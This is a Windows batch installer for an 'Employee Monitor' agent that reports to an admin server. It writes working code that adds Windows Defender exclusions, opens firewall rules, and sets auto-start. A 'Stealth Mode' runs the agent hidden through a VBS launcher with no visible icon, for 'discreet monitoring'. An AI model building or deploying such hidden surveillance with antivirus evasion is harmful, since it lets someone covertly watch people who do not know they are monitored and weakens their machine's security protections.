@echo off
setlocal EnableDelayedExpansion
title Employee Monitor - Agent Installer v1.0
mode con: cols=70 lines=40
color 0B

:: ============================================================
::  EMPLOYEE MONITOR - STANDALONE AGENT INSTALLER
::  No Python required - Uses compiled executable
:: ============================================================

set "INSTALL_DIR=C:\Program Files\EmployeeMonitor"
set "AGENT_NAME=EmployeeMonitor"
set "SERVER_PORT=3847"
set "SOURCE_DIR=%~dp0dist\EmployeeMonitor"

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    color 0C
    echo.
    echo  ======================================================
    echo   ERROR: ADMINISTRATOR RIGHTS REQUIRED
    echo  ======================================================
    echo.
    echo   Right-click this file and select:
    echo   "Run as administrator"
    echo.
    pause
    exit /b 1
)

:: Check source files exist
if not exist "%SOURCE_DIR%\EmployeeMonitor.exe" (
    color 0C
    echo.
    echo  ======================================================
    echo   ERROR: Agent executable not found!
    echo  ======================================================
    echo.
    echo   Expected: %SOURCE_DIR%\EmployeeMonitor.exe
    echo   Please run build_exe.py first.
    echo.
    pause
    exit /b 1
)

:: ==================== WELCOME SCREEN ====================
:WELCOME
cls
echo.
echo  ======================================================
echo  ^|                                                    ^|
echo  ^|     EMPLOYEE MONITOR - AGENT INSTALLER             ^|
echo  ^|     Version 1.0 - Standalone Edition               ^|
echo  ^|                                                    ^|
echo  ======================================================
echo.
echo   This installer will set up the Employee Monitor
echo   agent on this computer. No Python required.
echo.
echo   What will be installed:
echo     - Employee Monitor Agent Service
echo     - Auto-start on Windows login
echo     - Firewall rules for server connection
echo.
echo  ======================================================
echo.
echo   [1] Start Installation
echo   [2] Uninstall Agent
echo   [3] Check Status
echo   [4] Exit
echo.
set /p choice="  Select option (1-4): "

if "%choice%"=="1" goto CONFIGURE_SERVER
if "%choice%"=="2" goto UNINSTALL
if "%choice%"=="3" goto STATUS
if "%choice%"=="4" exit /b 0
goto WELCOME

:: ==================== SERVER CONFIGURATION ====================
:CONFIGURE_SERVER
cls
echo.
echo  ======================================================
echo   STEP 1 OF 3: SERVER CONNECTION
echo  ======================================================
echo.
echo   Enter the IP address or hostname of the Admin Panel PC.
echo.
echo   Examples:
echo     192.168.1.100
echo     ADMIN-PC
echo     monitor.company.com
echo.
set /p SERVER_IP="  Server address: "

if "%SERVER_IP%"=="" (
    color 0C
    echo.
    echo   ERROR: Server address cannot be empty!
    timeout /t 2 >nul
    color 0B
    goto CONFIGURE_SERVER
)

echo.
echo   Testing connection to %SERVER_IP%...
ping -n 1 -w 2000 %SERVER_IP% >nul 2>&1
if %errorLevel%==0 (
    color 0A
    echo   [OK] Server is reachable
    color 0B
) else (
    color 0E
    echo   [WARNING] Cannot ping server - may still work
    color 0B
)
echo.
timeout /t 2 >nul

:: ==================== EMPLOYEE NAME ====================
:CONFIGURE_NAME
cls
echo.
echo  ======================================================
echo   STEP 2 OF 3: EMPLOYEE INFORMATION
echo  ======================================================
echo.
echo   Enter the employee name for this computer.
echo   This will appear in the Admin Panel.
echo.
set /p EMP_NAME="  Employee name: "

if "%EMP_NAME%"=="" (
    set "EMP_NAME=%COMPUTERNAME%"
    echo.
    echo   Using computer name: %COMPUTERNAME%
)
echo.
timeout /t 1 >nul

:: ==================== INSTALL MODE ====================
:CONFIGURE_MODE
cls
echo.
echo  ======================================================
echo   STEP 3 OF 3: INSTALLATION MODE
echo  ======================================================
echo.
echo   Select how the agent should run:
echo.
echo   [1] NORMAL MODE
echo       - Agent icon visible in system tray
echo       - Employee can see monitoring status
echo       - Recommended for transparent monitoring
echo.
echo   [2] STEALTH MODE
echo       - Agent runs completely hidden
echo       - No visible icons or windows
echo       - No task manager visibility name
echo       - Recommended for discreet monitoring
echo.
set /p MODE="  Select mode (1-2): "

if "%MODE%"=="1" (
    set "STEALTH=false"
    set "MODE_NAME=Normal"
) else if "%MODE%"=="2" (
    set "STEALTH=true"
    set "MODE_NAME=Stealth"
) else (
    goto CONFIGURE_MODE
)

:: ==================== CONFIRM INSTALLATION ====================
:CONFIRM
cls
echo.
echo  ======================================================
echo   INSTALLATION SUMMARY
echo  ======================================================
echo.
echo   Server:        %SERVER_IP%:%SERVER_PORT%
echo   Employee:      %EMP_NAME%
echo   Mode:          %MODE_NAME%
echo   Install path:  %INSTALL_DIR%
echo.
echo  ======================================================
echo.
echo   [1] Confirm and Install
echo   [2] Go Back
echo   [3] Cancel
echo.
set /p confirm="  Select option (1-3): "

if "%confirm%"=="2" goto CONFIGURE_SERVER
if "%confirm%"=="3" goto WELCOME
if not "%confirm%"=="1" goto CONFIRM

:: ==================== INSTALLATION ====================
:INSTALL
cls
echo.
echo  ======================================================
echo   INSTALLING EMPLOYEE MONITOR AGENT
echo  ======================================================
echo.

:: Step 1
echo   [1/8] Stopping existing agent...
echo         ----------------------------------------
taskkill /F /IM EmployeeMonitor.exe >nul 2>&1
taskkill /F /IM pythonw.exe >nul 2>&1
timeout /t 2 /nobreak >nul
echo         [DONE] Existing processes stopped
echo.

:: Step 2
echo   [2/8] Creating install directory...
echo         ----------------------------------------
if exist "%INSTALL_DIR%" rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
mkdir "%INSTALL_DIR%" >nul 2>&1
mkdir "%INSTALL_DIR%\logs" >nul 2>&1
mkdir "%INSTALL_DIR%\data" >nul 2>&1
echo         [DONE] Created %INSTALL_DIR%
echo.

:: Step 3
echo   [3/8] Copying agent files...
echo         ----------------------------------------
echo         Copying EmployeeMonitor.exe...
xcopy "%SOURCE_DIR%\*" "%INSTALL_DIR%\" /E /Y /Q >nul 2>&1
if %errorLevel% neq 0 (
    color 0C
    echo         [ERROR] Failed to copy files!
    pause
    goto WELCOME
)
echo         [DONE] All files copied
echo.

:: Step 4
echo   [4/8] Configuring server connection...
echo         ----------------------------------------

:: Write config.json
(
echo {
echo   "agent_id": null,
echo   "server_host": "%SERVER_IP%",
echo   "server_port": %SERVER_PORT%,
echo   "employee_name": "%EMP_NAME%",
echo   "stealth_mode": %STEALTH%
echo }
) > "%INSTALL_DIR%\data\config.json"

:: Also write to APPDATA location
set "APPDATA_DIR=%APPDATA%\EmployeeMonitor"
mkdir "%APPDATA_DIR%" >nul 2>&1
copy "%INSTALL_DIR%\data\config.json" "%APPDATA_DIR%\config.json" /Y >nul 2>&1

echo         Server: %SERVER_IP%:%SERVER_PORT%
echo         Employee: %EMP_NAME%
echo         Mode: %MODE_NAME%
echo         [DONE] Configuration saved
echo.

:: Step 5
echo   [5/8] Adding Windows Defender exclusion...
echo         ----------------------------------------
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'EmployeeMonitor.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo         [DONE] Defender exclusions added
echo.

:: Step 6
echo   [6/8] Configuring firewall...
echo         ----------------------------------------
netsh advfirewall firewall delete rule name="%AGENT_NAME%" >nul 2>&1
netsh advfirewall firewall add rule name="%AGENT_NAME% Outbound" dir=out action=allow program="%INSTALL_DIR%\EmployeeMonitor.exe" >nul 2>&1
netsh advfirewall firewall add rule name="%AGENT_NAME% Inbound" dir=in action=allow program="%INSTALL_DIR%\EmployeeMonitor.exe" >nul 2>&1
echo         [DONE] Firewall rules added
echo.

:: Step 7
echo   [7/8] Setting up auto-start...
echo         ----------------------------------------

if "%STEALTH%"=="true" (
    :: Stealth mode - use VBS to run hidden
    (
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.CurrentDirectory = "%INSTALL_DIR%"
    echo WshShell.Run """%INSTALL_DIR%\EmployeeMonitor.exe"" --server %SERVER_IP% --port %SERVER_PORT%", 0, False
    ) > "%INSTALL_DIR%\start_hidden.vbs"

    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%AGENT_NAME%.lnk'); $s.TargetPath = '%INSTALL_DIR%\start_hidden.vbs'; $s.WorkingDirectory = '%INSTALL_DIR%'; $s.WindowStyle = 7; $s.Save()" >nul 2>&1
    echo         [DONE] Stealth auto-start enabled
) else (
    :: Normal mode - direct shortcut
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%AGENT_NAME%.lnk'); $s.TargetPath = '%INSTALL_DIR%\EmployeeMonitor.exe'; $s.Arguments = '--server %SERVER_IP% --port %SERVER_PORT%'; $s.WorkingDirectory = '%INSTALL_DIR%'; $s.Save()" >nul 2>&1
    echo         [DONE] Normal auto-start enabled
)
echo.

:: Step 8
echo   [8/8] Starting agent...
echo         ----------------------------------------

if "%STEALTH%"=="true" (
    cscript //nologo "%INSTALL_DIR%\start_hidden.vbs" >nul 2>&1
) else (
    start "" "%INSTALL_DIR%\EmployeeMonitor.exe" --server %SERVER_IP% --port %SERVER_PORT%
)
timeout /t 3 /nobreak >nul

:: Verify running
tasklist /FI "IMAGENAME eq EmployeeMonitor.exe" 2>nul | find /I "EmployeeMonitor.exe" >nul
if %errorLevel%==0 (
    color 0A
    echo         [DONE] Agent is running!
) else (
    color 0E
    echo         [WARNING] Agent may not have started
    echo         Check: %INSTALL_DIR%\logs\
)

:: ==================== COMPLETE ====================
echo.
echo.
color 0A
echo  ======================================================
echo  ^|                                                    ^|
echo  ^|     INSTALLATION COMPLETE!                         ^|
echo  ^|                                                    ^|
echo  ======================================================
echo.
echo   Install Path:  %INSTALL_DIR%
echo   Server:        %SERVER_IP%:%SERVER_PORT%
echo   Employee:      %EMP_NAME%
echo   Mode:          %MODE_NAME%
echo   Auto-start:    Enabled
echo   Status:        Running
echo.
echo   The agent is now monitoring this computer
echo   and reporting to the Admin Panel.
echo.
echo  ======================================================
echo.
pause
color 0B
goto WELCOME

:: ==================== UNINSTALL ====================
:UNINSTALL
cls
color 0C
echo.
echo  ======================================================
echo   UNINSTALLING EMPLOYEE MONITOR AGENT
echo  ======================================================
echo.
echo   This will completely remove the agent from this PC.
echo.
set /p unconfirm="  Are you sure? (Y/N): "
if /I not "%unconfirm%"=="Y" (
    color 0B
    goto WELCOME
)
echo.

echo   [1/6] Stopping agent...
taskkill /F /IM EmployeeMonitor.exe >nul 2>&1
taskkill /F /IM pythonw.exe >nul 2>&1
timeout /t 2 /nobreak >nul
echo         [DONE]

echo   [2/6] Removing auto-start...
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%AGENT_NAME%.lnk" >nul 2>&1
echo         [DONE]

echo   [3/6] Removing firewall rules...
netsh advfirewall firewall delete rule name="%AGENT_NAME% Outbound" >nul 2>&1
netsh advfirewall firewall delete rule name="%AGENT_NAME% Inbound" >nul 2>&1
netsh advfirewall firewall delete rule name="%AGENT_NAME%" >nul 2>&1
echo         [DONE]

echo   [4/6] Removing Defender exclusions...
powershell -Command "Remove-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Remove-MpPreference -ExclusionProcess 'EmployeeMonitor.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo         [DONE]

echo   [5/6] Removing config data...
rmdir /S /Q "%APPDATA%\EmployeeMonitor" >nul 2>&1
echo         [DONE]

echo   [6/6] Deleting program files...
rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
echo         [DONE]

echo.
color 0A
echo  ======================================================
echo   UNINSTALLATION COMPLETE
echo  ======================================================
echo.
echo   All agent files and configurations removed.
echo.
pause
color 0B
goto WELCOME

:: ==================== STATUS ====================
:STATUS
cls
echo.
echo  ======================================================
echo   AGENT STATUS
echo  ======================================================
echo.

echo   Process Status:
tasklist /FI "IMAGENAME eq EmployeeMonitor.exe" 2>nul | find /I "EmployeeMonitor.exe" >nul
if %errorLevel%==0 (
    color 0A
    echo         Status: RUNNING
    color 0B
) else (
    color 0C
    echo         Status: NOT RUNNING
    color 0B
)

echo.
echo   Installation:
if exist "%INSTALL_DIR%\EmployeeMonitor.exe" (
    echo         Installed: YES
    echo         Path: %INSTALL_DIR%
) else (
    echo         Installed: NO
)

echo.
echo   Auto-start:
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%AGENT_NAME%.lnk" (
    echo         Auto-start: ENABLED
) else (
    echo         Auto-start: DISABLED
)

echo.
echo   Firewall:
netsh advfirewall firewall show rule name="%AGENT_NAME% Outbound" >nul 2>&1
if %errorLevel%==0 (
    echo         Firewall rule: EXISTS
) else (
    echo         Firewall rule: NOT FOUND
)

echo.
echo   Configuration:
if exist "%APPDATA%\EmployeeMonitor\config.json" (
    echo         Config: Found
    type "%APPDATA%\EmployeeMonitor\config.json"
) else (
    echo         Config: NOT FOUND
)

echo.
echo  ======================================================
echo.
pause
goto WELCOME
